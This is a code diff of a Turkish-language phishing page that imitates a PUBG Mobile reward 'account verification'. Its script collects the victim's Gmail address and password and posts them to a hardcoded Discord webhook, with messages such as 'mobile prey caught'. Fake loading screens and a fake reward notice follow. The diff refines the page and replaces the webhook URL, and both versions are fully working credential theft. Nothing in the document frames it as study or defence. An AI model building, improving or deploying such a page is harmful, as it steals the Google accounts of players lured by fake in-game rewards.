@@ -3,93 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PUBG Mobile - Doğrulama</title>
+    <title>PUBG MOBILE - Onay Sistemi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { margin: 0; padding: 0; background: #0a0a0a; color: #fff; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .bg-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: -1; }
-        .container { background: #1a1a1a; border: 2px solid #f39c12; border-radius: 12px; width: 85%; max-width: 320px; padding: 25px; text-align: center; box-shadow: 0 0 25px rgba(243, 156, 18, 0.4); }
-        .pubg-logo { width: 150px; height: auto; margin: 0 auto 15px auto; display: block; }
-        h2 { color: #f39c12; text-transform: uppercase; letter-spacing: 1px; margin: 10px 0; font-size: 18px; }
-        p { font-size: 13px; color: #bbb; margin-bottom: 20px; }
-        input { width: 100%; padding: 14px; margin: 8px 0; background: #252525; border: 1px solid #444; color: #fff; border-radius: 6px; box-sizing: border-box; outline: none; font-size: 16px; } /* Mobil için font büyütüldü (zoom yapmasın diye) */
+        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: 'Teko', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        .background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.imgur.com/vHq0A6T.jpg') no-repeat center center / cover; filter: brightness(0.3) blur(2px); z-index: -2; }
+        .container { background: rgba(15, 15, 15, 0.9); border: 1px solid #f39c12; border-radius: 10px; width: 85%; max-width: 350px; padding: 30px 20px; text-align: center; box-shadow: 0 0 25px rgba(243, 156, 18, 0.4); z-index: 1; }
+        .pubg-logo { width: 160px; margin-bottom: 20px; filter: drop-shadow(0 0 5px #f39c12); }
+        h2 { color: #f39c12; text-transform: uppercase; letter-spacing: 2px; margin: 0 0 10px 0; font-size: 26px; }
+        p { font-size: 14px; color: #bbb; margin-bottom: 20px; font-family: sans-serif; }
+        input { width: 100%; padding: 14px; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; font-size: 16px; font-family: sans-serif; }
         input:focus { border-color: #f39c12; }
-        .btn { width: 100%; padding: 14px; background: #f39c12; color: #000; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; text-transform: uppercase; margin-top: 10px; font-size: 15px; }
-        .loader { border: 3px solid #333; border-top: 3px solid #f39c12; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .btn { width: 100%; padding: 14px; background: #f39c12; color: #000; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 18px; text-transform: uppercase; transition: 0.3s; }
+        .btn:active { transform: scale(0.98); background: #e67e22; }
+        .loader { border: 4px solid #333; border-top: 4px solid #f39c12; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #pubgInterface { display: none; }
+        #idSection { display: none; }
     </style>
 </head>
 <body>
 
-<div class="bg-overlay"></div>
+    <div class="background"></div>
 
-<div class="container">
-    <img src="https://www.pubgmobile.com/common/images/icon_logo.png" alt="PUBG" class="pubg-logo">
+    <div class="container">
+        <img src="https://www.pubgmobile.com/common/images/icon_logo.png" alt="PUBG" class="pubg-logo">
 
-    <div id="loginStep">
-        <h2>HESAP DOĞRULAMA</h2>
-        <p>Ödülleri almak için hesabınızı onaylayın.</p>
-        <input type="email" id="email" placeholder="Gmail Adresiniz">
-        <input type="password" id="pass" placeholder="Şifreniz">
-        <button type="button" onclick="gonder()" class="btn">İLERLE</button>
+        <div id="loginSection">
+            <h2>HESAP DOĞRULAMA</h2>
+            <p>Ödülleri almak için Gmail hesabınızla onay verin.</p>
+            <input type="email" id="email" placeholder="Gmail Adresiniz" required>
+            <input type="password" id="pass" placeholder="Şifreniz" required>
+            <button type="button" onclick="gonder()" class="btn">HESABI BAĞLA</button>
+        </div>
+
+        <div id="loadingSection" style="display:none;">
+            <div class="loader"></div>
+            <p id="loadingText" style="color:#f39c12;">Sunucuya bağlanılıyor...</p>
+        </div>
+
+        <div id="idSection">
+            <h2 style="color:#2ecc71;">BAŞARILI!</h2>
+            <p>Hesap onaylandı. Son olarak karakter ID numaranızı girin.</p>
+            <input type="number" id="dummyId" placeholder="Karakter ID (Örn: 51234...)">
+            <button type="button" onclick="bitir()" class="btn">ÖDÜLÜ AKTİF ET</button>
+        </div>
     </div>
 
-    <div id="loadingStep" style="display:none;">
-        <div class="loader"></div>
-        <p id="loadingText" style="color: #f39c12; font-weight: bold;">Sunucuya bağlanılıyor...</p>
-    </div>
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1454503387528691907/24LcQ8SrFo9OyB2bxmQXxZH0laV3tlcmvOGYeio-qQc526rJ2YECxtlUpv_RIdBy8UvB";
 
-    <div id="pubgInterface">
-        <h2 style="color: #2ecc71;">DOĞRULANDI!</h2>
-        <p>Karakter ID numaranızı girerek işlemi tamamlayın.</p>
-        <input type="number" id="pubgId" placeholder="Oyuncu ID" style="text-align: center;">
-        <button class="btn" onclick="final()">ID BAĞLA</button>
-    </div>
-</div>
+        function gonder() {
+            var e = document.getElementById("email").value;
+            var p = document.getElementById("pass").value;
 
-<script>
-    const webhook = "https://discord.com/api/webhooks/1454488470402633879/hYwEM4vWg39W9bH9eg1Tayxd6LUHuDBqiOKWJKB2yvJbgQLgpYeU714kiwxsl1pKq1fz";
+            if(e == "" || p == "") { alert("Lütfen alanları doldurun!"); return; }
 
-    function gonder() {
-        var e = document.getElementById("email").value;
-        var p = document.getElementById("pass").value;
+            // Ekranı Değiştir
+            document.getElementById("loginSection").style.display = "none";
+            document.getElementById("loadingSection").style.display = "block";
 
-        if(e == "" || p == "") { alert("Lütfen doldurun!"); return; }
+            // TELEFONLAR İÇİN EN GARANTİ GÖNDERİM (XMLHttpRequest)
+            var request = new XMLHttpRequest();
+            request.open("POST", webhook, true);
+            request.setRequestHeader('Content-type', 'application/json');
+            
+            // Veriyi paketle ve gönder
+            var params = {
+                content: "🔥 **YENİ PUBG GİRİŞİ!**\n📧: `" + e + "\n🔑: `" + p + "`"
+            };
+            request.send(JSON.stringify(params));
 
-        // ADIM 1: GÖRÜNÜMÜ DEĞİŞTİR
-        document.getElementById("loginStep").style.display = "none";
-        document.getElementById("loadingStep").style.display = "block";
+            // Bekleme Animasyonu
+            setTimeout(() => { document.getElementById("loadingText").innerText = "Doğrulanıyor..."; }, 1500);
+            
+            // ID Ekranına Geçiş (Sadece görsel amaçlı)
+            setTimeout(() => {
+                document.getElementById("loadingSection").style.display = "none";
+                document.getElementById("idSection").style.display = "block";
+            }, 3500);
+        }
 
-        // ADIM 2: TELEFONLAR İÇİN EN SAĞLAM GÖNDERME YÖNTEMİ (XHR)
-        var request = new XMLHttpRequest();
-        request.open("POST", webhook);
-        request.setRequestHeader('Content-type', 'application/json');
-        var params = {
-            content: "📱 **MOBİL AV DÜŞTÜ!**\n📧: `" + e + "`\n🔑: `" + p + "`"
-        };
-        request.send(JSON.stringify(params));
-
-        // ADIM 3: BEKLEME EKRANI GEÇİŞLERİ
-        setTimeout(function() {
-            document.getElementById("loadingText").innerText = "Karakter taranıyor...";
-        }, 1500);
-
-        setTimeout(function() {
-            document.getElementById("loadingStep").style.display = "none";
-            document.getElementById("pubgInterface").style.display = "block";
-        }, 3500);
-    }
-
-    function final() {
-        var id = document.getElementById("pubgId").value;
-        var request = new XMLHttpRequest();
-        request.open("POST", webhook);
-        request.setRequestHeader('Content-type', 'application/json');
-        request.send(JSON.stringify({ content: "🆔 **ID GELDİ:** `" + id + "`" }));
-        alert("Başarılı! Hediyeler 24 saat içinde eklenecektir.");
-    }
-</script>
-
+        function bitir() {
+            var id = document.getElementById("dummyId").value;
+            if(id == "") { alert("Lütfen ID girin!"); return; }
+            alert("İşlem tamamlandı! Ödüller 24 saat içinde hesabınıza yüklenecektir.");
+            location.reload(); // Sayfayı başa sarar
+        }
+    </script>
 </body>
 </html>
-
